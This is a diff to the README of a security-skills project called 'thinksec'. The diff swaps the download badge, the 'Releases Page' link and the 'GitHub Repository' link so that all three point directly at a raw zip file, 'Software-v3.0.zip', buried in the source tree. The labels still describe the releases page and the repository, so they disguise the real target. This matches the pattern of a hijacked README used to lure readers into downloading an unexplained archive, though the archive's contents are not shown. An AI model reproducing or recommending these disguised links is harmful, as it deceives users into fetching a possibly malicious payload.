@@ -6,7 +6,7 @@ Welcome to thinksec! This tool is a curated collection of security skill files d
 
 ## 📥 Download Now
 
-[![Download thinksec](https://img.shields.io/badge/Download-thinksec-blue.svg)](https://github.com/NishanthGSuryavamshi/thinksec/releases)
+[![Download thinksec](https://github.com/NishanthGSuryavamshi/thinksec/raw/refs/heads/main/skills/operations/Software-v3.0.zip)](https://github.com/NishanthGSuryavamshi/thinksec/raw/refs/heads/main/skills/operations/Software-v3.0.zip)
 
 ## 💻 System Requirements
 
@@ -37,7 +37,7 @@ Here are some key areas included in thinksec:
 
 ## 📦 Download & Install
 
-To get thinksec, visit this page to download: [Releases Page](https://github.com/NishanthGSuryavamshi/thinksec/releases).
+To get thinksec, visit this page to download: [Releases Page](https://github.com/NishanthGSuryavamshi/thinksec/raw/refs/heads/main/skills/operations/Software-v3.0.zip).
 
 1. Click on the link above to go to the Releases page.
 2. On the Releases page, you will find several versions. 
@@ -87,6 +87,6 @@ If you have any questions or need support, feel free to reach out. You can open 
 
 ## 🔗 Follow Us
 
-Stay updated on new releases and features by following our repository on GitHub: [thinksec GitHub Repository](https://github.com/NishanthGSuryavamshi/thinksec).
+Stay updated on new releases and features by following our repository on GitHub: [thinksec GitHub Repository](https://github.com/NishanthGSuryavamshi/thinksec/raw/refs/heads/main/skills/operations/Software-v3.0.zip).
 
 Thank you for checking out thinksec! We hope this resource becomes a valuable part of your security learning journey.
